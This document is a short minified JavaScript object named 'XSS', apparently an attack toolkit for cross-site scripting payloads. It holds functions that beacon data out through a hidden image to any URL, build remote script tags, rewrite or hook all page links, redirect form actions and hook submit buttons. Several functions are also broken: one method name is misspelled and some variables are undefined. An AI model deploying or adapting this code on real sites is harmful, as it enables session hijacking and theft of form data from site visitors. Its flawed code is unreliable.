
var XSS={imgTag:null,get:function(url){var self=this;if(self.imgTag==null)
{self.imgTag=document.createElement('img');self.imgTag.setAttribute('style','display: none;');}
self.imgTag.setAttribute('src',url);},load:function(url){var script=document.createElement('script');script.setAttribute('type','text/javascript');script.setAttribute('src',url);},rewriteLinks:function(callback){var links=document.getElementsByTagName('a');var length=links.length;for(var i=0;i<length;i+=1){var link=links[i];if(link.hasAttribute('href')){if(callback&&(typeof callback==="function")){link.setAttribute('href',callback(link.getAttribute('href')));}}};},hookLinks:function(callback){var links=document.getElementByTagName('a');var length=links.length;for(var i=0;i<length;i+=1){var link=links[i];if(link.hasAttribute('href')){if(callback&&(typeof callback==="function")){link.onclick=callback;}}};},rewriteForms:function(callback){var forms=document.getElementByTagName('form');var length=links.length;for(var i=0;i<length;i+=1){var link=links[i];if(link.hasAttribute('action')){if(callback&&(typeof callback==="function")){form.setAttribute('action',callback(form.getAttribute('action')));}}};},hookForms:function(callback){var inputs=document.getElementByTagName('input');var length=links.length;for(var i=0;i<length;i+=1){var link=links[i];if(input.hasAttribute('type')&&(input.getAttribute('type')==='submit')){if(callback&&(typeof callback==="function")){input.onclick=callback;}}};}};